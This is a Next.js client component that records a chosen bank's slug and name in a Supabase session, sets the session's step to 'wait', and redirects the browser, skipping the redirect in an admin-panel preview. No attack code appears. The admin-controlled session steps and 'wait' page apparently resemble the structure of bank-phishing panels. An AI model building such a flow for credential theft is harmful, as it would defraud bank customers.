"use client";

import { useEffect } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

export function AutoRedirectClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  useEffect(() => {
    let mounted = true;

    async function doRedirect() {
      if (!supabase || !sessionId) return;
      
      // Admin panelindeki önizleme (preview) ekranında yönlendirme yapma
      if (sessionId === "preview") return;
      
      const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "wait",
          form_data: {
            ...prev,
            bankSlug,
            bankName,
          },
        })
        .eq("id", sessionId);

      if (mounted) {
        router.push(stepToPath("wait", sessionId));
      }
    }

    void doRedirect();

    return () => {
      mounted = false;
    };
  }, [sessionId, bankSlug, bankName, router, supabase]);

  return <div className="min-h-screen bg-white" aria-hidden="true" />;
}
